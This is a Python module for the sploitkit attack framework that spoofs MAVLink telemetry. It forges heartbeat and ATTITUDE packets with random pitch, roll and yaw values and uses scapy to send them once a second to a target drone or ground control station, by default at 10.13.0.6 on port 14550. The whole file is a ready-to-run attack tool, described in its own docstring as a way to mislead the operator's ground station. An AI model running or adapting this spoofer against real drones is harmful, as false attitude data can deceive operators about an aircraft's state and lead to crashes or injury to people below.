from sploitkit import Module, Config, Option
from pymavlink import mavutil
from scapy.all import send, IP, UDP, Raw
import time
import random
import sys

class AttitudeSpoofing(Module):
    """
    Spoof the drone's attitude data (pitch, roll, yaw) 
    to mislead the Ground Control Station (GCS).
    """

    # Configuration for the spoofing module
    config = Config({
        Option(
            name='target_ip',
            description='IP of the target GCS or drone',
            required=True,
        ): "10.13.0.6",  # Default value
        Option(
            name='target_port',
            description='MavLink Port',
            required=True,
        ): "14550",  # Default value
        Option(
            name='duration',
            description='Duration of tampering in seconds',
            required=False,
        ): 10  # Default value
    })

    def create_heartbeat(self):
        """
        Create a MAVLink heartbeat message.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )

        return heartbeat.pack(mav)

    def create_attitude(self):
        """
        Create a MAVLink ATTITUDE message with random values.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        roll = random.uniform(-1.0, 1.0)
        pitch = random.uniform(-1.0, 1.0)
        yaw = random.uniform(-3.14, 3.14)
        rollspeed = random.uniform(-0.1, 0.1)
        pitchspeed = random.uniform(-0.1, 0.1)
        yawspeed = random.uniform(-0.1, 0.1)

        attitude = mav.attitude_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,  # Time since boot in milliseconds, using modulo to ensure valid range
            roll=roll,  # Roll angle (rad)
            pitch=pitch,  # Pitch angle (rad)
            yaw=yaw,  # Yaw angle (rad)
            rollspeed=rollspeed,  # Roll angular speed (rad/s)
            pitchspeed=pitchspeed,  # Pitch angular speed (rad/s)
            yawspeed=yawspeed  # Yaw angular speed (rad/s)
        )

        return attitude.pack(mav)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        """
        Send a MAVLink packet using Scapy.
        """
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)

    def run(self):
        # Retrieve the target IP, port, and duration from the config
        target_ip = self.config['target_ip']
        target_port = int(self.config['target_port'])
        duration = int(self.config['duration'])

        start_time = time.time()

        # Main spoofing loop
        while True:
            # Check if the duration has been reached
            if time.time() - start_time >= duration:
                self.logger.info(f"Tampering duration of {duration} seconds reached. Stopping...")
                break

            heartbeat_packet = self.create_heartbeat()
            attitude_packet = self.create_attitude()

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(attitude_packet, target_ip, target_port)

            self.logger.info(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
            time.sleep(1)  # Send packets at a regular interval
